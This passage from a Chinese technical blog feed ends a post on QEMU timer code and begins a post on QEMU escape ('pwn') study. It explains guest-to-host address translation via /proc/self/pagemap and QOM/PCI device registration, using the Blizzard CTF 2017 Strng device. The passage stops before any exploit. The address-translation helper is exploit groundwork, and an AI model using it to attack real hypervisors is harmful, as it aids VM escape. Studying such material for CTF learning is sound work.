class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Extract expired timers from active timers list and process them.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * In rr mode we need "filtered" checkpointing for virtual clock.  The</span></span><br><span class="line"><span class="comment">     * checkpoint must be recorded/replayed before processing any non-EXTERNAL timer,</span></span><br><span class="line"><span class="comment">     * and that must only be done once since the clock value stays the same. Because</span></span><br><span class="line"><span class="comment">     * non-EXTERNAL timers may appear in the timers list while it being processed,</span></span><br><span class="line"><span class="comment">     * the checkpoint can be issued at a time until no timers are left and we are</span></span><br><span class="line"><span class="comment">     * done".</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    current_time = qemu_clock_get_ns(timer_list-&gt;clock-&gt;type);</span><br><span class="line">    qemu_mutex_lock(&amp;timer_list-&gt;active_timers_lock);</span><br><span class="line">    <span class="keyword">while</span> ((ts = timer_list-&gt;active_timers)) {</span><br><span class="line">        <span class="keyword">if</span> (!timer_expired_ns(ts, current_time)) {</span><br><span class="line">            <span class="comment">/* No expired timers left.  The checkpoint can be skipped</span></span><br><span class="line"><span class="comment">             * if no timers fired or they were all external.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="comment">/* Checkpoint for virtual clock is redundant in cases where</span></span><br><span class="line"><span class="comment">         * it's being triggered with only non-EXTERNAL timers, because</span></span><br><span class="line"><span class="comment">         * these timers don't change guest state directly.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (replay_mode != REPLAY_MODE_NONE</span><br><span class="line">            &amp;&amp; timer_list-&gt;clock-&gt;type == QEMU_CLOCK_VIRTUAL</span><br><span class="line">            &amp;&amp; !(ts-&gt;attributes &amp; QEMU_TIMER_ATTR_EXTERNAL)</span><br><span class="line">            &amp;&amp; !replay_checkpoint(CHECKPOINT_CLOCK_VIRTUAL)) {</span><br><span class="line">            qemu_mutex_unlock(&amp;timer_list-&gt;active_timers_lock);</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* remove timer from the list before calling the callback */</span></span><br><span class="line">        timer_list-&gt;active_timers = ts-&gt;next;</span><br><span class="line">        ts-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">        ts-&gt;expire_time = <span class="number">-1</span>;</span><br><span class="line">        cb = ts-&gt;cb;</span><br><span class="line">        opaque = ts-&gt;opaque;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* run the callback (the timer list can be modified) */</span></span><br><span class="line">        qemu_mutex_unlock(&amp;timer_list-&gt;active_timers_lock);</span><br><span class="line">        cb(opaque);</span><br><span class="line">        qemu_mutex_lock(&amp;timer_list-&gt;active_timers_lock);</span><br><span class="line"></span><br><span class="line">        progress = <span class="literal">true</span>;</span><br><span class="line">    }</span><br><span class="line">    qemu_mutex_unlock(&amp;timer_list-&gt;active_timers_lock);</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">    qemu_event_set(&amp;timer_list-&gt;timers_done_ev);</span><br><span class="line">    <span class="keyword">return</span> progress;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="两个有趣的东西"><a href="#两个有趣的东西" class="headerlink" title="两个有趣的东西"></a>两个有趣的东西</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*include/sysemu/cpu-timers.h*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* icount - Instruction Counter API */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * icount enablement state:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 0 = Disabled - Do not count executed instructions.</span></span><br><span class="line"><span class="comment"> * 1 = Enabled - Fixed conversion of insn to ns via "shift" option</span></span><br><span class="line"><span class="comment"> * 2 = Enabled - Runtime adaptive algorithm to compute shift</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_TCG</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> use_icount;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> icount_enabled() (use_icount)</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> icount_enabled() 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * WITH_QEMU_LOCK_GUARD - Lock a lock object for scope</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @x: a lock object (currently one of QemuMutex, CoMutex, QemuSpin).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This macro defines a lock scope such that entering the scope takes the lock</span></span><br><span class="line"><span class="comment"> * and leaving the scope releases the lock.  Return statements are allowed</span></span><br><span class="line"><span class="comment"> * within the scope and release the lock.  Break and continue statements leave</span></span><br><span class="line"><span class="comment"> * the scope early and release the lock.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   WITH_QEMU_LOCK_GUARD(&amp;mutex) {</span></span><br><span class="line"><span class="comment"> *       ...</span></span><br><span class="line"><span class="comment"> *       if (error) {</span></span><br><span class="line"><span class="comment"> *           return; &lt;-- mutex is automatically unlocked</span></span><br><span class="line"><span class="comment"> *       }</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *       if (early_exit) {</span></span><br><span class="line"><span class="comment"> *           break;  &lt;-- leave this scope early</span></span><br><span class="line"><span class="comment"> *       }</span></span><br><span class="line"><span class="comment"> *       ...</span></span><br><span class="line"><span class="comment"> *   }</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WITH_QEMU_LOCK_GUARD(x) \</span></span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> 虚拟化 </category>
          
          <category> Qemu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Qemu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Qemu pwn的第一次尝试</title>
      <link href="/2023/Qemu-pwn%20study/"/>
      <url>/2023/Qemu-pwn%20study/</url>
      
        <content type="html"><![CDATA[<p>(<del>Qemu pwn == Kernel Mode的交互 + User Mode的利用</del></p><h2 id="gva-hva"><a href="#gva-hva" class="headerlink" title="gva -> hva"></a>gva -&gt; hva</h2><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gva -&gt; gpa: 读/proc/self/pagemap获取gva对应的gpa</span><br><span class="line">gpa + hva_start == hva: 理解一下: Guset的物理内存是Host(Qemu进程)虚拟地址空间中一段连续的区域 </span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><span id="more"></span><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311261411947.png"></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint64_t</span> <span class="title function_">gva_to_gfn</span><span class="params">(<span class="type">void</span> *addr)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">uint64_t</span> pme, gfn;</span><br><span class="line">    <span class="type">size_t</span> offset;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">"/proc/self/pagemap"</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) {</span><br><span class="line">        Err(<span class="string">"open pagemap"</span>);</span><br><span class="line">    }</span><br><span class="line">    offset = ((<span class="type">uintptr_t</span>)addr &gt;&gt; <span class="number">9</span>) &amp; ~<span class="number">7</span>;</span><br><span class="line">    lseek(fd, offset, SEEK_SET);</span><br><span class="line">    read(fd, &amp;pme, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (!(pme &amp; PFN_PRESENT))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    gfn = pme &amp; PFN_PFN;</span><br><span class="line">    <span class="keyword">return</span> gfn;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">gva_to_gpa</span><span class="params">(<span class="type">void</span> *addr)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">uint64_t</span> gfn = gva_to_gfn(addr);</span><br><span class="line">    assert(gfn != <span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">return</span> (gfn &lt;&lt; PAGE_SHIFT) | page_offset((<span class="type">uint64_t</span>)addr);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="设备注册-识别-交互的关键结构体"><a href="#设备注册-识别-交互的关键结构体" class="headerlink" title="设备注册,识别,交互的关键结构体"></a>设备注册,识别,交互的关键结构体</h2><p>设备从注册到交互,以Blizzard CTF 2017 Strng为例:<br>type_register_static注册一个Type,在TypeInfo结构中设置Type的名称,父类,实例大小,实例初始化函数与类初始化函数,最终根据TypeInfo来生成一个TypeImpl的对象(该对象在堆上,反编译是找不到的).</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">pci_strng_register_types</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">static</span> <span class="type">const</span> TypeInfo strng_info = {</span><br><span class="line">        .name          = <span class="string">"strng"</span>,</span><br><span class="line">        .parent        = TYPE_PCI_DEVICE,</span><br><span class="line">        .instance_size = <span class="keyword">sizeof</span>(STRNGState),</span><br><span class="line">        .instance_init = strng_instance_init,</span><br><span class="line">        .class_init    = strng_class_init,</span><br><span class="line">    };</span><br><span class="line"></span><br><span class="line">    type_register_static(&amp;strng_info);</span><br><span class="line">}</span><br><span class="line">type_init(pci_strng_register_types)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> TypeInfo pci_testdev_info = {</span><br><span class="line">        .name          = TYPE_PCI_TEST_DEV,</span><br><span class="line">        .parent        = TYPE_PCI_DEVICE,</span><br><span class="line">        .instance_size = <span class="keyword">sizeof</span>(PCITestDevState),</span><br><span class="line">        .class_init    = pci_testdev_class_init,</span><br><span class="line">};</span><br><span class="line">TypeImpl *<span class="title function_">type_register_static</span><span class="params">(<span class="type">const</span> TypeInfo *info)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">return</span> type_register(info);</span><br><span class="line">}</span><br><span class="line">TypeImpl *<span class="title function_">type_register</span><span class="params">(<span class="type">const</span> TypeInfo *info)</span></span><br><span class="line">{</span><br><span class="line">    assert(info-&gt;parent);</span><br><span class="line">    <span class="keyword">return</span> type_register_internal(info);</span><br><span class="line">}</span><br><span class="line"><span class="type">static</span> TypeImpl *<span class="title function_">type_register_internal</span><span class="params">(<span class="type">const</span> TypeInfo *info)</span></span><br><span class="line">{</span><br><span class="line">    TypeImpl *ti;</span><br><span class="line">    ti = type_new(info);</span><br><span class="line">    type_table_add(ti);</span><br><span class="line">    <span class="keyword">return</span> ti;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>完整的TypeInfo,TypeImpl结构</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TypeInfo</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *name;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *parent;</span><br><span class="line">    <span class="type">size_t</span> instance_size;</span><br><span class="line">    <span class="type">void</span> (*instance_init)(Object *obj);</span><br><span class="line">    <span class="type">void</span> (*instance_post_init)(Object *obj);</span><br><span class="line">    <span class="type">void</span> (*instance_finalize)(Object *obj);</span><br><span class="line">    <span class="type">bool</span> abstract;</span><br><span class="line">    <span class="type">size_t</span> class_size;</span><br><span class="line">    <span class="type">void</span> (*class_init)(ObjectClass *klass, <span class="type">void</span> *data);</span><br><span class="line">    <span class="type">void</span> (*class_base_init)(ObjectClass *klass, <span class="type">void</span> *data);</span><br><span class="line">    <span class="type">void</span> (*class_finalize)(ObjectClass *klass, <span class="type">void</span> *data);</span><br><span class="line">    <span class="type">void</span> *class_data;</span><br><span class="line">    InterfaceInfo *interfaces;</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TypeImpl</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *name;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> class_size;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> instance_size;</span><br><span class="line">    <span class="type">size_t</span> instance_align;</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> (*class_init)(ObjectClass *klass, <span class="type">void</span> *data);</span><br><span class="line">    <span class="type">void</span> (*class_base_init)(ObjectClass *klass, <span class="type">void</span> *data);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> *class_data;</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> (*instance_init)(Object *obj);</span><br><span class="line">    <span class="type">void</span> (*instance_post_init)(Object *obj);</span><br><span class="line">    <span class="type">void</span> (*instance_finalize)(Object *obj);</span><br><span class="line"></span><br><span class="line">    <span class="type">bool</span> abstract;</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *parent;</span><br><span class="line">    TypeImpl *parent_type;</span><br><span class="line"></span><br><span class="line">    ObjectClass *<span class="class"><span class="keyword">class</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> num_interfaces;</span><br><span class="line">    InterfaceImpl interfaces[MAX_INTERFACES];</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p>QOM有一个基类,所有的类继承于它.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* include/qom/object.h */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">TypeImpl</span> *<span class="title">Type</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ObjectClass</span> <span class="title">ObjectClass</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ObjectClass</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">    <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">    Type type;  </span><br><span class="line">    GSList *interfaces;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *object_cast_cache[OBJECT_CLASS_CAST_CACHE];</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *class_cast_cache[OBJECT_CLASS_CAST_CACHE];</span><br><span class="line">    ObjectUnparent *unparent;</span><br><span class="line">    GHashTable *properties;</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="comment">/* include/qom/object.h */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">TypeImpl</span> *<span class="title">Type</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ObjectClass</span> <span class="title">ObjectClass</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ObjectClass</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">        <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">        Type type;       <span class="comment">/* points to the current Type's instance */</span></span><br><span class="line">        ...</span><br><span class="line"><span class="comment">/* include/hw/qdev-core.h */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">DeviceClass</span> {</span></span><br><span class="line">        <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">        ObjectClass parent_class;</span><br><span class="line">        <span class="comment">/*&lt; public &gt;*/</span></span><br><span class="line">        ...</span><br><span class="line"><span class="comment">/* include/hw/pci/pci.h */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">PCIDeviceClass</span> {</span></span><br><span class="line">        DeviceClass parent_class;</span><br><span class="line">        ...</span><br></pre></td></tr></tbody></table></figure><p>对应还有一个代表基类对象的Object.<br>本题是Object-&gt;Device-&gt;PCIDevice-&gt;Strng这样的继承关系.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> {</span></span><br><span class="line">    PCIDevice pdev;</span><br><span class="line">    MemoryRegion mmio;</span><br><span class="line">    MemoryRegion pmio;</span><br><span class="line">    <span class="type">uint32_t</span> addr;</span><br><span class="line">    <span class="type">uint32_t</span> regs[STRNG_MMIO_REGS];</span><br><span class="line">    <span class="type">void</span> (*srand)(<span class="type">unsigned</span> <span class="type">int</span> seed);</span><br><span class="line">    <span class="type">int</span> (*rand)(<span class="type">void</span>);</span><br><span class="line">    <span class="type">int</span> (*rand_r)(<span class="type">unsigned</span> <span class="type">int</span> *seed);</span><br><span class="line">} STRNGState;</span><br></pre></td></tr></tbody></table></figure><p>PCI设备类初始化方式: 设置设备对应的device_id,vendor_id等,使得该PCI设备能被识别,设置realize函数,当被识别时调用.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">strng_class_init</span><span class="params">(ObjectClass *class, <span class="type">void</span> *data)</span></span><br><span class="line">{</span><br><span class="line">    PCIDeviceClass *k = PCI_DEVICE_CLASS(class);</span><br><span class="line"></span><br><span class="line">    k-&gt;realize = pci_strng_realize;</span><br><span class="line">    k-&gt;vendor_id = PCI_VENDOR_ID_QEMU;</span><br><span class="line">    k-&gt;device_id = <span class="number">0x11e9</span>;</span><br><span class="line">    k-&gt;revision = <span class="number">0x10</span>;</span><br><span class="line">    k-&gt;class_id = PCI_CLASS_OTHERS;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/* include/hw/pci/pci.h */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">PCIDeviceClass</span> {</span></span><br><span class="line">    DeviceClass parent_class;</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> (*realize)(PCIDevice *dev, Error **errp);</span><br><span class="line">    <span class="type">int</span> (*init)(PCIDevice *dev);<span class="comment">/* TODO convert to realize() and remove */</span></span><br><span class="line">    PCIUnregisterFunc *<span class="built_in">exit</span>;</span><br><span class="line">    PCIConfigReadFunc *config_read;</span><br><span class="line">    PCIConfigWriteFunc *config_write;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint16_t</span> vendor_id;</span><br><span class="line">    <span class="type">uint16_t</span> device_id;</span><br><span class="line">    <span class="type">uint8_t</span> revision;</span><br><span class="line">    <span class="type">uint16_t</span> class_id;</span><br><span class="line">    <span class="type">uint16_t</span> subsystem_vendor_id;       <span class="comment">/* only for header type = 0 */</span></span><br><span class="line">    <span class="type">uint16_t</span> subsystem_id;              <span class="comment">/* only for header type = 0 */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * pci-to-pci bridge or normal device.</span></span><br><span class="line"><span class="comment">     * This doesn't mean pci host switch.</span></span><br><span class="line"><span class="comment">     * When card bus bridge is supported, this would be enhanced.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">int</span> is_bridge;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* pcie stuff */</span></span><br><span class="line">    <span class="type">int</span> is_express;   <span class="comment">/* is this device pci express? */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* rom bar */</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *romfile;</span><br><span class="line">} PCIDeviceClass;</span><br></pre></td></tr></tbody></table></figure><p>设备被识别时注册mmio,pmio的区域和函数表.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> MemoryRegionOps strng_mmio_ops = {</span><br><span class="line">    .read = strng_mmio_read,</span><br><span class="line">    .write = strng_mmio_write,</span><br><span class="line">    .endianness = DEVICE_NATIVE_ENDIAN,</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> MemoryRegionOps strng_pmio_ops = {</span><br><span class="line">    .read = strng_pmio_read,</span><br><span class="line">    .write = strng_pmio_write,</span><br><span class="line">    .endianness = DEVICE_LITTLE_ENDIAN,</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">pci_strng_realize</span><span class="params">(PCIDevice *pdev, Error **errp)</span></span><br><span class="line">{</span><br><span class="line">    STRNGState *strng = DO_UPCAST(STRNGState, pdev, pdev);</span><br><span class="line"></span><br><span class="line">    memory_region_init_io(&amp;strng-&gt;mmio, OBJECT(strng), &amp;strng_mmio_ops, strng, <span class="string">"strng-mmio"</span>, STRNG_MMIO_SIZE);</span><br><span class="line">    pci_register_bar(pdev, <span class="number">0</span>, PCI_BASE_ADDRESS_SPACE_MEMORY, &amp;strng-&gt;mmio);</span><br><span class="line">    memory_region_init_io(&amp;strng-&gt;pmio, OBJECT(strng), &amp;strng_pmio_ops, strng, <span class="string">"strng-pmio"</span>, STRNG_PMIO_SIZE);</span><br><span class="line">    pci_register_bar(pdev, <span class="number">1</span>, PCI_BASE_ADDRESS_SPACE_IO, &amp;strng-&gt;pmio);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>实例的初始化.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> STRNG(obj) OBJECT_CHECK(STRNGState, obj, <span class="string">"strng"</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">strng_instance_init</span><span class="params">(Object *obj)</span></span><br><span class="line">{</span><br><span class="line">    STRNGState *strng = STRNG(obj);</span><br><span class="line"></span><br><span class="line">    strng-&gt;srand = srand;</span><br><span class="line">    strng-&gt;rand = rand;</span><br><span class="line">    strng-&gt;rand_r = rand_r;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>完成上述步骤后设备实例初始化完毕,若客户机读写设备注册的MMIO区域或与PMIO端口,Qemu回调设备函数表中的相应函数.</p><p>比较让人混淆的是TypeImpl,instance,XXXClass的概念.<br>可以从class_init函数切入.类的初始化函数,听起来有点莫名其妙,咱们平时所说的初始化一般都是初始化类的对象,好像没有初始化类的说法.<br>因为平时所说的类的概念,是语言本身提供的,在编译期实现,可以指定类有哪些成员,成员变量的初值,类的构造函数.而Qemu是在运行中实现类的概念.<br>根据设置的TypeInfo信息创建的TypeImpl对象是XXX类定义的一部分,包含类名,类大小,类的初始化函数及类实例(对象)的初始化函数(构造函数)等.class_init函数的工作,相当于完成语言中定义类时为成员变量设置默认初值的工作,也包括父类的虚函数的赋值.而instance_init则类似于构造函数,用来初始化一个该类型的实例(对象).</p><p>总结起来,从面向对象语言的角度来看,XXXClass,TypeImpl实际上都属于类的定义,instance是类的对象.</p><h2 id="Blizzard-CTF-2017-Strng"><a href="#Blizzard-CTF-2017-Strng" class="headerlink" title="Blizzard CTF 2017 Strng"></a>Blizzard CTF 2017 Strng</h2><h3 id="一些信息搜集"><a 